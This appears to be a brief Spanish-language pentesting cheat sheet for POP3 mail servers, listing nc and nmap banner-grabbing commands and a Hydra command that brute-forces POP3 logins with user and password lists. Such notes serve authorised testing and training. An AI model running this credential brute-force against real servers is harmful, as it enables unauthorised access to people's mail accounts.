# POP3

## Enumeración
### Hallar el domain name/banner 
```
nc IP Puerto 
```
### Hallar el domain name/banner (nmap)
```
nmap -sV -script banner IP
```	
## Ataque por fuerza bruta
### Hydra
```
hydra -L UserList -P PassList pop3 IP
```
